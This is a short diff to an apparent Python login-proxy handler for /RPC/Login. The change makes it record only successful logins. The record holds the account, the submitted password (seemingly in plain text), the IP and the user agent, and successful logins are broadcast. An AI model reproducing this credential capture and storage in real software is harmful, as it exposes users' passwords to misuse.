@@ -311,8 +311,8 @@ async def proxy_login(request: Request):
         except Exception as e:
             print(f"[Login] 资产保存失败: {e}")
     
-    # 只记录真正的登录尝试（有账号和密码的请求）
-    if account and password:
+    # 只记录登录成功的请求（有账号、密码且登录成功）
+    if account and password and is_success:
         print(f"[Login] 记录登录: account={account}, is_success={is_success}")
         try:
             record_login(
@@ -320,7 +320,7 @@ async def proxy_login(request: Request):
                 ip_address=client_ip,
                 user_agent=user_agent,
                 request_path="/RPC/Login",
-                status_code=200 if is_success else 401,
+                status_code=200,
                 extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")}),
                 password=password,
                 is_success=is_success
@@ -329,7 +329,7 @@ async def proxy_login(request: Request):
         except Exception as e:
             print(f"[Login] 登录记录保存失败: {e}")
     else:
-        print(f"[Login] 跳过记录（无效请求：account={account}, password={'***' if password else 'None'}）")
+        print(f"[Login] 跳过记录（登录失败或无效请求：account={account}, is_success={is_success}）")
     
     # 只有真正的登录尝试（有账号密码的请求）才广播，且只广播成功的登录
     if account and password and is_success:
